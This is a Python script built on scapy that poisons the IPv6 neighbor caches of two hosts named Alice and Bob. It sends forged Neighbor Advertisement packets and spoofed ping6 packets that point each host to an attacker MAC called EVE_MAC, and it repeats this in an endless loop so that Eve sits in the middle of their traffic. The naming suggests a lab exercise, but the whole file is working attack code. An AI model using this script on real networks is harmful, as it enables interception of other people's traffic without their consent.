from scapy.all import *
import time
from network_details import *

def build_fake_na(victim_mac, victim_ip, target_ip):
    """
:   function build fake Neighbor Discovery NA packet.
:   param victim_mac: the mac address of who will poison.
:   type victim_mac: string
:   param victim_ip: the ipv6 address of who will poison.
:   type victim_ip: string
:   param target_ip: ip will be in tgt field of NA packet.
:   type target_ip: string
:   return: the fake Neighbor Advertisment packet
:   rtype: scapy packet
    """
    ether = Ether(src=EVE_MAC, dst=victim_mac)
    ipv6 = IPv6(src=target_ip, dst=victim_ip)
    na = ICMPv6ND_NA(R=0,S=1,O=1,tgt=target_ip)
    dst_lladdr = ICMPv6NDOptDstLLAddr(lladdr=EVE_MAC)
    return ether / ipv6 / na / dst_lladdr


def send_fake_na(victim_mac, victim_ip, target_ip):
    """
:   send the fake NA packet after building by parameters.
:   param victim_mac: the mac address of who will poison.
:   type victim_mac: string
:   param victim_ip: the ipv6 address of who will poison.
:   type victim_ip: string
:   param target_ip: ip will be in tgt field of NA packet.
:   type target_ip: string
:   rtype: None
    """
    fake_na = build_fake_na(victim_mac, victim_ip, target_ip)
    sendp(fake_na, verbose=0)


def build_fake_ping6(victim_mac, victim_ip, target_ip):
    """
:   function build fake ping6 packet.
:   param victim_mac: the mac address of who will poison.
:   type victim_mac: string
:   param victim_ip: the ipv6 address of who will poison.
:   type victim_ip: string
:   param target_ip: ip will be in tgt field of NA packet.
:   type target_ip: string
:   return: the fake Neighbor Advertisment packet
:   rtype: scapy packet
    """
    ether = Ether(src=EVE_MAC, dst=victim_mac)
    ipv6 = IPv6(src=target_ip, dst=victim_ip)
    icmpv6 = ICMPv6EchoRequest(id=1,seq=1,data='hey')
    return ether / ipv6 / icmpv6


def send_fake_ping6(victim_mac, victim_ip, target_ip):
    """
:   send the fake ping6 packet after building by parameters.
:   param victim_mac: the mac address of who will poison.
:   type victim_mac: string
:   param victim_ip: the ipv6 address of who will poison.
:   type victim_ip: string
:   param target_ip: ip will be in tgt field of NA packet.
:   type target_ip: string
:   rtype: None
    """
    fake_ping6 = build_fake_ping6(victim_mac, victim_ip, target_ip)
    sendp(fake_ping6, verbose=0)


def poison_alice():
    """
:   function send fake ping6 ("from Bob") and fake
:   NA packets to Alice for cache poisoning
    """
    send_fake_ping6(ALICE_MAC, ALICE_IPv6, BOB_IPv6)
    send_fake_na(ALICE_MAC, ALICE_IPv6, BOB_IPv6)


def poison_bob():
    """
:   function send fake ping6 ("from Alice") and fake
:   NA packets to Bob for cache poisoning
    """
    send_fake_ping6(BOB_MAC, BOB_IPv6, ALICE_IPv6)
    send_fake_na(BOB_MAC, BOB_IPv6, ALICE_IPv6)


def poison():
    """
:   function poison Alice & Bob
:   together forever.
:   one secode wating between
:   poison to poison.
    """
    while True:
        poison_alice()
        poison_bob()    
        time.sleep(1)

